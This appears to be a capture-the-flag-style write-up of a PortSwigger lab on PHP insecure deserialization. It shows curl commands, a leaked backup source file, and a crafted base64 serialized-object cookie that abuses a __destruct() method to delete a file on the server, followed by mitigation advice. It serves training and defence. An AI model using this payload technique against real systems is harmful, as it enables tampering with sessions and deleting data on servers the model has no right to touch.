@@ -1,0 +1,231 @@
+---
+title: "Arbitrary Object Injection in PHP (Insecure Deserialization)"
+description: "How to exploit PHP insecure deserialization to inject arbitrary objects and trigger magic methods for remote file deletion."
+labUrl: "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php"
+category: "Object Injection (PHP)"
+date: "2025-01-02"
+---
+
+## Lab Description (contains spoilers)
+
+This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+## Necessary Background Concepts To Solve The Lab
+
+### What is Serialization?
+
+Serialization is the process of converting an object (a data structure in memory) into a format that can be stored or transmitted, like a string. Deserialization is the reverse: turning that string back into an object. In PHP, this is done with `serialize()` and `unserialize()`.
+
+For example, a PHP object like:
+```php
+$user = new User();
+$user->username = "wiener";
+$user->access_token = "abc123";
+```
+
+Gets serialized into:
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:6:"abc123";}
+```
+
+Breaking down the format:
+- `O:4:"User"` — **O**bject of class name length **4**, named **"User"**
+- `:2:` — has **2** properties
+- `s:8:"username"` — **s**tring property name of length **8**: **"username"**
+- `s:6:"wiener"` — **s**tring value of length **6**: **"wiener"**
+
+When an application stores serialized objects in cookies (like session tokens), an attacker can tamper with them. If the server blindly deserializes user-controlled input, it will reconstruct whatever object the attacker provides.
+
+### What are PHP Magic Methods?
+
+PHP has special methods called **magic methods** that are automatically invoked at certain points in an object's lifecycle. They always start with a double underscore (`__`). The most relevant ones for deserialization attacks are:
+
+- `__construct()` — called when an object is **created** (`new ClassName()`)
+- `__destruct()` — called when an object is **destroyed** (goes out of scope, script ends, or garbage collected)
+- `__wakeup()` — called when an object is **deserialized** (`unserialize()`)
+- `__toString()` — called when an object is treated as a **string**
+
+The dangerous one here is `__destruct()`. When PHP deserializes an object from a cookie, it creates that object in memory. When the request finishes processing, PHP's garbage collector destroys the object, which **automatically triggers `__destruct()`**. The attacker doesn't need to call it — PHP does it for them.
+
+### What is a Backup File (~)?
+
+Many text editors (like Vim, Emacs, and others) automatically create backup copies of files by appending a tilde (`~`) to the filename. For example, editing `CustomTemplate.php` creates `CustomTemplate.php~`. These backup files often get accidentally deployed to production servers and can leak source code to anyone who requests them, since the web server serves them as plain text instead of executing them as PHP.
+
+## Writeup
+
+First let's explore the lab and log in to get a valid session cookie:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/login" | cat
+```
+
+> **Command breakdown**: \
+`-s` = silent mode (no progress meter) \
+`| cat` = pipe response output to my [customized cat command](https://github.com/echoesofwhoami/echoes-bat-theme) for stylish display
+
+The login page has a simple form with no CSRF token:
+
+![Login Form Screenshot](/images/deserialization-arbitrary-object-injection-in-php/01_login_form.png)
+
+There's also an interesting HTML comment at the bottom of the page:
+
+```html
+<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
+```
+
+This hints at a PHP file that might be interesting. Let's log in first:
+
+```bash
+curl -s -D - "https://<lab-url>.web-security-academy.net/login" \
+  -d "username=wiener&password=peter" 2>/dev/null | head -10
+```
+
+> **Command breakdown**: \
+`-D -` = dump response headers to stdout \
+`-d "username=wiener&password=peter"` = send POST data (automatically sets method to POST and Content-Type to application/x-www-form-urlencoded)
+
+Response:
+
+```
+HTTP/2 302
+location: /my-account?id=wiener
+set-cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4cWlsb2F0eTZncTBiczZjNnl1NHBwNGZjYmY2dXEzdiI7fQ%3d%3d; Secure; HttpOnly; SameSite=None
+```
+
+The session cookie looks like base64. Let's decode it:
+
+```bash
+echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4cWlsb2F0eTZncTBiczZjNnl1NHBwNGZjYmY2dXEzdiI7fQ==" | base64 -d
+```
+
+Output:
+
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xqiloaty6gq0bs6c6yu4pp4fcbf6uq3v";}
+```
+
+This is a **serialized PHP object**. The server is storing the entire User object in the session cookie. This means we control what gets deserialized on the server — a critical vulnerability.
+
+Now let's investigate that `CustomTemplate.php` file we found in the HTML comment. Requesting the PHP file directly would just execute it, but we can try to get the backup file by appending a tilde (`~`):
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/libs/CustomTemplate.php~" | cat
+```
+
+Response:
+
+```php
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+    private $lock_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+        $this->lock_file_path = $template_file_path . ".lock";
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lock_file_path);
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lock_file_path, "") === false) {
+                throw new Exception("Could not write to " . $this->lock_file_path);
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+        }
+    }
+}
+```
+
+Carlos is about to regret his idea of using the `__destruct()` magic method. \
+Let's analyze the role of this piece of code in our attack:
+
+```php
+function __destruct() {
+    // Carlos thought this would be a good idea
+    if (file_exists($this->lock_file_path)) {
+        unlink($this->lock_file_path);
+    }
+}
+```
+
+When a `CustomTemplate` object is destroyed, it calls `unlink()` on whatever path is stored in `$this->lock_file_path`. The `unlink()` function in PHP **deletes a file**. If we can control `lock_file_path`, we can delete any file on the server.
+
+**The attack plan:**
+
+1. Craft a serialized `CustomTemplate` object with `lock_file_path` set to `/home/carlos/morale.txt`
+2. Base64-encode it (to match the session cookie format)
+3. Send it as the session cookie
+4. When PHP deserializes the cookie, it creates our `CustomTemplate` object
+5. When the request finishes, PHP garbage-collects the object, triggering `__destruct()`
+6. `__destruct()` calls `unlink("/home/carlos/morale.txt")` — deleting the file
+
+Let's craft the serialized payload:
+
+```
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+
+Breaking this down:
+- `O:14:"CustomTemplate"` — Object of class **CustomTemplate** (14 chars)
+- `:1:` — with **1** property
+- `s:14:"lock_file_path"` — string property name **lock_file_path** (14 chars)
+- `s:23:"/home/carlos/morale.txt"` — string value **/home/carlos/morale.txt** (23 chars)
+
+Now base64-encode it:
+
+```bash
+echo -n 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}' | base64 -w0
+```
+
+> **Command breakdown**: \
+`echo -n` = print without trailing newline (important for clean base64 encoding) \
+`base64 -w0` = base64 encode with no line wrapping
+
+Output:
+
+```
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
+```
+
+Now send the request with our malicious session cookie:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/my-account?id=wiener" \
+  -b "session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d"
+```
+
+> **Command breakdown**: \
+`-b "session=..."` = send a cookie with the request. This replaces the legitimate session cookie with our malicious serialized object \
+`%3d%3d` = URL-encoded `==` (the base64 padding characters need to be URL-encoded in cookies)
+
+The server returns a `500 Internal Server Error` — which is expected. The server tried to use our `CustomTemplate` object as a `User` object and failed. But that doesn't matter: by the time the error is thrown, PHP has already deserialized our object and when the script ends, `__destruct()` fires and deletes the file.
+
+**Carlos's file has been incinerated via insecure php object deserialization attack, accomplishing the lab's objective.**
+
+## Mitigation
+
+1. **Never deserialize untrusted data**: Avoid using `unserialize()` on user-controlled input entirely. Use safer formats like JSON (`json_encode`/`json_decode`) for session data
+2. **Use signed/encrypted sessions**: If you must serialize session data, sign it with HMAC or encrypt it so tampering is detected
+3. **Server-side session storage**: Store session data on the server (files, database, Redis) and only give the client an opaque session ID
+4. **Remove backup files**: Ensure editor backup files (`~`, `.bak`, `.swp`) are never deployed to production. Adding the proper regex for each e.g.: `.*~` to `.gitignore` is a quick and easy way to prevent them from being committed, but more important is to configure the web server to block access to them
+5. **Audit magic methods**: Review `__destruct()`, `__wakeup()`, and other magic methods for dangerous operations like file deletion, command execution, or database queries
